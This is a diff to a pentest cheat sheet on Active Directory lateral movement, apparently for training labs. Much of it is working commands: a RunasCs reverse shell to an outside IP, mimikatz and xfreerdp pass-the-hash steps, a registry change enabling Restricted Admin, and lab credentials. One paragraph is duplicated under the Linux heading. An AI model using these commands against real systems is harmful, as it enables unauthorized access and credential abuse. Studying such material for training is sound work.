@@ -9,6 +9,9 @@ tags:
 
 # Lateral movements
 
+When you have access to AD credentials, we suggest using RDP as much as possible. If you use PowerShell Remoting and winrm to connect to a machine, you may no longer be able to run domain enumeration tools as you will experience the Kerberos Double Hop issue. To avoid it, the simplest way is to use RDP. Kerberos Double-Hop is discussed in detail in the PEN-300 course material.
+
+
 
 ## Windows
 
@@ -60,6 +63,40 @@ Run a reverse shell:
 .\RunasCS.exe svc_ldap M1XyC9pW7qT5Vn  powershell.exe -r 10.10.14.129:1234 
 ```
 
+
+#### Remote Desktop Protocol with mimikatz
+
+If the host we want to lateral move to has "RestrictedAdmin" enabled, we can pass the hash using the RDP protocol and get an interactive session without the plaintext password.
+
+```
+#We execute pass-the-hash using mimikatz and spawn an instance of mstsc.exe with the "/restrictedadmin" flag
+privilege::debug
+sekurlsa::pth /user:<Username> /domain:<DomainName> /ntlm:<NTLMHash> /run:"mstsc.exe /restrictedadmin"
+
+#Then just click ok on the RDP dialogue and enjoy an interactive session as the user we impersonated
+```
+
+
+#### Remote Desktop Protocol with xFreeRDP
+
+```
+xfreerdp3  +compression +clipboard +dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8  /u:<Username> /pth:<NTLMHash> /v:<Hostname | IPAddress>
+
+```
+
+TRoubleshooting:  If Restricted Admin mode is disabled on the remote machine we can connect on the host using another tool/protocol like psexec or winrm and enable it by creating the following registry key and setting it's value zero: "HKLM:\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin".
+
+
+## Linux
+
+When you have access to AD credentials, we suggest using RDP as much as possible. If you use PowerShell Remoting and winrm to connect to a machine, you may no longer be able to run domain enumeration tools as you will experience the Kerberos Double Hop issue. To avoid it, the simplest way is to use RDP. Kerberos Double-Hop is discussed in detail in the PEN-300 course material.
+
+
+
+```bash
+xfreerdp /u:stephanie /d:corp.com /v:192.168.50.75
+# pass: LegmanTeamBenzoin!!
+```
 
 
 
